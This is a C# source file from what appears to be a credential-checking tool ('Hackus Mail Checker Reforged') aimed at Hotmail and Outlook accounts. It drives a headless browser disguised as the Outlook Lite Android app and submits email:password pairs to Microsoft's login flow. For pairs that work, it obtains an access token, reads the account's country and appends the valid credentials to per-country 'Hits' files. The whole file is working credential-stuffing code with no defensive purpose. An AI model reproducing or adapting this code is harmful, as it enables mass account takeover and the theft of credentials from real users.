using System;
using System.Collections.Generic;
using System.IO;
using System.Text.RegularExpressions;
using System.Threading;
using System.Threading.Tasks;
using Hackus_Mail_Checker_Reforged.Models;
using Hackus_Mail_Checker_Reforged.Models.Enums;
using Hackus_Mail_Checker_Reforged.Services.Managers;
using Hackus_Mail_Checker_Reforged.Services.Settings;
using Microsoft.Playwright;

namespace Hackus_Mail_Checker_Reforged.Net.Web
{
    /// <summary>
    /// Hotmail V1 - Mobile API (Outlook Lite Android)
    /// Extracts country from: substrate.office.com/profileb2/v2.0/me/V1Profile
    /// </summary>
    internal class HotmailClientV1
    {
        private Mailbox _mailbox;
        private static IPlaywright _playwright;
        private static IBrowser _browser;
        private static bool _isInitialized = false;
        private static readonly SemaphoreSlim _initSemaphore = new SemaphoreSlim(1, 1);

        public HotmailClientV1(Mailbox mailbox)
        {
            this._mailbox = mailbox;
        }

        public static async Task InitializeAsync()
        {
            if (_isInitialized) return;

            await _initSemaphore.WaitAsync();
            try
            {
                if (_isInitialized) return;

                // Auto-install Playwright browsers if not already installed
                try
                {
                    var exitCode = Microsoft.Playwright.Program.Main(new[] { "install", "chromium", "--with-deps" });
                    if (exitCode != 0)
                    {
                        System.Diagnostics.Debug.WriteLine("Warning: Playwright browser installation returned non-zero exit code");
                    }
                }
                catch (Exception ex)
                {
                    System.Diagnostics.Debug.WriteLine($"Warning: Could not auto-install Playwright browsers: {ex.Message}");
                    // Continue anyway - browsers might already be installed
                }

                _playwright = await Playwright.CreateAsync();
                _browser = await _playwright.Chromium.LaunchAsync(new BrowserTypeLaunchOptions
                {
                    Headless = true,
                    Args = new[]
                    {
                        "--disable-blink-features=AutomationControlled",
                        "--disable-dev-shm-usage",
                        "--no-sandbox"
                    }
                });

                _isInitialized = true;
            }
            finally
            {
                _initSemaphore.Release();
            }
        }

        ~HotmailClientV1()
        {
            try
            {
                DisposeAsync().GetAwaiter().GetResult();
            }
            catch
            {
                // Suppress exceptions in finalizer
            }
        }

        public OperationResult Handle()
        {
            if (this._mailbox?.Address == null)
                return OperationResult.Error;

            var result = LoginAsync().GetAwaiter().GetResult();

            StatisticsManager.Instance.Increment(result);
            FileManager.SaveStatistics(this._mailbox.Address, this._mailbox.Password, result);

            if (result == OperationResult.Ok && !SearchSettings.Instance.Search)
            {
                MailManager.Instance.AddResult(new MailboxResult(this._mailbox));
            }

            return result;
        }

        private async Task<OperationResult> LoginAsync()
        {
            if (!_isInitialized)
                await InitializeAsync();

            var context = await _browser.NewContextAsync(new BrowserNewContextOptions
            {
                UserAgent = "Mozilla/5.0 (Linux; Android 9; SM-G975N Build/PQ3B.190801.08041932; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/91.0.4472.114 Mobile Safari/537.36 PKeyAuth/1.0",
                ViewportSize = new ViewportSize { Width = 412, Height = 915 },
                ExtraHTTPHeaders = new Dictionary<string, string>
                {
                    { "X-OneAuth-AppName", "Outlook Lite" },
                    { "X-Office-Version", "3.11.0-minApi24" },
                    { "X-Office-Application", "145" },
                    { "X-OneAuth-Version", "1.83.0" },
                    { "X-Office-Platform", "Android" },
                    { "X-Office-Platform-Version", "28" },
                    { "X-OneAuth-AppId", "com.microsoft.outlooklite" }
                }
            });

            var page = await context.NewPageAsync();

            try
            {
                // Step 1: Navigate to OAuth authorize
                await page.GotoAsync(
                    "https://login.microsoftonline.com/consumers/oauth2/v2.0/authorize?" +
                    "client_info=1&haschrome=1&" +
                    $"login_hint={Uri.EscapeDataString(_mailbox.Address)}&" +
                    "mkt=en&response_type=code&" +
                    "client_id=e9b154d0-7658-433b-bb25-6b8e0a8a7c59&" +
                    "scope=profile%20openid%20offline_access%20https%3A%2F%2Foutlook.office.com%2FM365.Access&" +
                    "redirect_uri=msauth%3A%2F%2Fcom.microsoft.outlooklite%2Ffcg80qvoM1YMKJZibjBwQcDfOno%253D",
                    new PageGotoOptions { WaitUntil = WaitUntilState.NetworkIdle }
                );

                // Step 2: Extract POST URL and PPFT token
                var content = await page.ContentAsync();
                var urlMatch = Regex.Match(content, "urlPost\\\":\\\"([^\\\"]+)\\\"");
                var ppftMatch = Regex.Match(content, "name=\\\\\\\"PPFT\\\\\\\" id=\\\\\\\"i0327\\\\\\\" value=\\\\\\\"([^\\\"]+)\\\"");

                if (!urlMatch.Success || !ppftMatch.Success)
                {
                    await context.CloseAsync();
                    return OperationResult.Error;
                }

                string postUrl = urlMatch.Groups[1].Value.Replace("\\u0026", "&");
                string ppft = ppftMatch.Groups[1].Value;

                // Step 3: Submit credentials via form
                await page.SetContentAsync(
                    $"<form method='POST' action='{postUrl}'>" +
                    $"<input name='login' value='{_mailbox.Address}'/>" +
                    $"<input name='loginfmt' value='{_mailbox.Address}'/>" +
                    $"<input name='passwd' value='{_mailbox.Password}'/>" +
                    $"<input name='PPFT' value='{ppft}'/>" +
                    $"<input name='i13' value='1'/>" +
                    $"<input name='type' value='11'/>" +
                    $"<input name='LoginOptions' value='1'/>" +
                    $"<input name='ps' value='2'/>" +
                    "</form>"
                );

                await page.EvaluateAsync("document.forms[0].submit()");
                await page.WaitForLoadStateAsync(LoadState.NetworkIdle);

                var finalUrl = page.Url;
                var finalContent = await page.ContentAsync();

                // Step 4: Check result
                if (finalContent.Contains("account or password is incorrect") ||
                    finalContent.Contains("error"))
                {
                    await context.CloseAsync();
                    return OperationResult.Bad;
                }

                if (finalContent.Contains("/Abuse") || finalUrl.Contains("finisherror"))
                {
                    await context.CloseAsync();
                    return OperationResult.Error;
                }

                if (finalUrl.Contains("oauth20_desktop.srf?") ||
                    finalContent.Contains("JSH") ||
                    finalContent.Contains("WLSSC"))
                {
                    // Success - extract auth code
                    var codeMatch = Regex.Match(finalUrl, "code=([^&]+)");
                    if (!codeMatch.Success)
                    {
                        await context.CloseAsync();
                        return OperationResult.Error;
                    }

                    string authCode = codeMatch.Groups[1].Value;

                    // Step 5: Exchange code for access token
                    await page.SetContentAsync(
                        "<form method='POST' action='https://login.microsoftonline.com/consumers/oauth2/v2.0/token'>" +
                        "<input name='client_id' value='e9b154d0-7658-433b-bb25-6b8e0a8a7c59'/>" +
                        "<input name='redirect_uri' value='msauth://com.microsoft.outlooklite/fcg80qvoM1YMKJZibjBwQcDfOno%3D'/>" +
                        "<input name='grant_type' value='authorization_code'/>" +
                        $"<input name='code' value='{authCode}'/>" +
                        "<input name='scope' value='profile openid offline_access https://outlook.office.com/M365.Access'/>" +
                        "</form>"
                    );

                    await page.EvaluateAsync("document.forms[0].submit()");
                    await page.WaitForLoadStateAsync(LoadState.NetworkIdle);

                    var tokenContent = await page.ContentAsync();
                    var tokenMatch = Regex.Match(tokenContent, "\"access_token\"\\s*:\\s*\"([^\"]+)\"");

                    if (!tokenMatch.Success)
                    {
                        await context.CloseAsync();
                        return OperationResult.Error;
                    }

                    string accessToken = tokenMatch.Groups[1].Value;

                    // Step 6: Get user profile (contains country)
                    await page.SetExtraHTTPHeadersAsync(new Dictionary<string, string>
                    {
                        { "Authorization", $"Bearer {accessToken}" },
                        { "User-Agent", "Outlook-Android/2.0" },
                        { "Accept", "application/json" }
                    });

                    await page.GotoAsync(
                        "https://substrate.office.com/profileb2/v2.0/me/V1Profile",
                        new PageGotoOptions { WaitUntil = WaitUntilState.NetworkIdle }
                    );

                    var profileContent = await page.ContentAsync();
                    var countryMatch = Regex.Match(profileContent, "\"location\"\\s*:\\s*\"([^\"]+)\"");

                    string country = countryMatch.Success ? countryMatch.Groups[1].Value : "Unknown";

                    // Step 7: Save to country-specific file
                    SaveToHits(country, _mailbox.Address, _mailbox.Password);

                    await context.CloseAsync();
                    return OperationResult.Ok;
                }

                await context.CloseAsync();
                return OperationResult.Bad;
            }
            catch (Exception ex)
            {
                System.Diagnostics.Debug.WriteLine($"[HotmailClientV1] Login error: {ex.Message}");
                await context.CloseAsync();
                return OperationResult.Error;
            }
        }

        private void SaveToHits(string country, string email, string password)
        {
            try
            {
                string hitsDir = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "Hits", "Hotmail");
                Directory.CreateDirectory(hitsDir);

                string fileName = $"{SanitizeFileName(country)}.txt";
                string filePath = Path.Combine(hitsDir, fileName);

                File.AppendAllText(filePath, $"{email}:{password}\n");
            }
            catch (Exception ex)
            {
                System.Diagnostics.Debug.WriteLine($"[HotmailClientV1] Failed to save hits: {ex.Message}");
            }
        }

        private string SanitizeFileName(string fileName)
        {
            foreach (char c in Path.GetInvalidFileNameChars())
            {
                fileName = fileName.Replace(c, '_');
            }
            return fileName;
        }

        public static async Task DisposeAsync()
        {
            if (!_isInitialized) return;

            try
            {
                if (_browser != null)
                {
                    await _browser.CloseAsync();
                    await _browser.DisposeAsync();
                    _browser = null;
                }

                if (_playwright != null)
                {
                    _playwright.Dispose();
                    _playwright = null;
                }
            }
            catch (Exception ex)
            {
                System.Diagnostics.Debug.WriteLine($"Error disposing Playwright resources: {ex.Message}");
            }
            finally
            {
                _isInitialized = false;
            }
        }
    }
}
